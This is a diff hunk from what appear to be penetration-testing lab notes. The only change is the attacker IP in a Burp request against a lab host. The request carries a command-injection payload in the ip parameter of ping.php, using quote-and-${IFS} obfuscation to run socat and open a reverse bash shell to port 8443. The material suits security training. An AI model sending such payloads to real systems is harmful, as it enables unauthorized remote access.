@@ -8,7 +8,7 @@ change /etc/hosts to -> 10.129.229.147
 
 from this section we know our burp request is going to look like -> 
 
-GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.15.252:8443${IFS}EXEC:bash HTTP/1.1
+GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.15.183:8443${IFS}EXEC:bash HTTP/1.1
 Host: monitoring.inlanefreight.local
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
 Content-Type: application/json
